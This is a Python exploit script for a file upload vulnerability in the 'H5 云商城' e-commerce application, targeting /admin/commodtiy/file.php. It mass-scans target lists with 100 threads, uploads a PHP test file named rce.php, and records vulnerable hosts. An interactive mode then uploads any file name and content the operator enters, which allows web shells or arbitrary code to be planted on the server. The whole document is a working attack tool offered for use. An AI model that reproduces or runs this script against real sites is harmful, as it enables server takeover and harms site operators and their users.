#H5 云商城 file.php 文件上传漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text = '''

 
███████╗██╗██╗     ███████╗    ██╗   ██╗██████╗ ██╗      █████╗  ██████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██║   ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██║██║     █████╗      ██║   ██║██████╔╝██║     ███████║██║   ██║██║  ██║
██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔═══╝ ██║     ██╔══██║██║   ██║██║  ██║
██║     ██║███████╗███████╗    ╚██████╔╝██║     ███████╗██║  ██║╚██████╔╝██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝                                                ░                                ░        
                                                                version:H5_YSC_fileupload 1.0
'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="H5 云商城 file.php 文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()

    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                i = i.strip()
                if 'https://' in i:
                    url_list.append(i)
                else:
                    i = 'http://' + i
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/admin/commodtiy/file.php?upload=1'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx"
    }
    data = '''
------WebKitFormBoundaryFQqYtrIWb8iBxUCx
Content-Disposition: form-data; name="file"; filename="rce.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundaryFQqYtrIWb8iBxUCx--

    '''
    try:
        response = requests.post(url=url,headers=headers,data=data,timeout=5)
        print(response.text)
        if response.status_code == 200 and 'admin' in response.text:
            print( f"{GREEN}[+] {url} 存在文件上传漏洞！{RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception:
        pass

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)

    url_payload = '/admin/commodtiy/file.php?upload=1'
    url = target + url_payload
    while True:
        filename = input('请输入要上传的文件名>')
        code = input('请输入文件的内容：',)
        if filename == 'q' or code == 'q':
            print("正在退出,请等候……")
            break
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx;charset=utf-8"
        }
        data = f'''
------WebKitFormBoundaryFQqYtrIWb8iBxUCx
Content-Disposition: form-data; name="file"; filename="{filename}"
Content-Type: application/octet-stream

{code}
------WebKitFormBoundaryFQqYtrIWb8iBxUCx--

        '''
        # print(data)
        res = requests.post(url=url,headers=headers,data=data,timeout=5)
        print(res.text)
        # print(res.status_code)
if __name__ == '__main__':
    main()
